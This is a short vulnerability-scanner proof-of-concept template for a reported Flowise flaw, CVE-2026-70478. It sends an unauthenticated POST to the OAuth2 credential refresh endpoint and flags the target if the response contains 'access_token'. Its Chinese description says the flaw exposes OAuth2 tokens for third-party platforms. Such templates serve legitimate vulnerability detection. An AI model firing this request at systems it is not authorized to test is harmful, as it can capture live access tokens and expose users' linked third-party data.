[info]
author = "ave"
description = "验证 Flowise OAuth2 令牌刷新端点未授权访问漏洞。向 /api/v1/oauth2-credential/refresh/{credentialId} 发送无认证 POST 请求，若响应体包含 access_token 则表明漏洞存在。攻击者可利用此漏洞窃取 OAuth2 访问令牌并访问第三方平台关联数据。"
id = "POC-AVE-2026-1373"
name = "CVE-2026-70478 PoC"
severity = "critical"
tags = ["ave-2026-1373"]
vuln_id = [
    "CVE-2026-70478",
    "AVE-2026-1373",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/api/v1/oauth2-credential/refresh/1"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["access_token"]
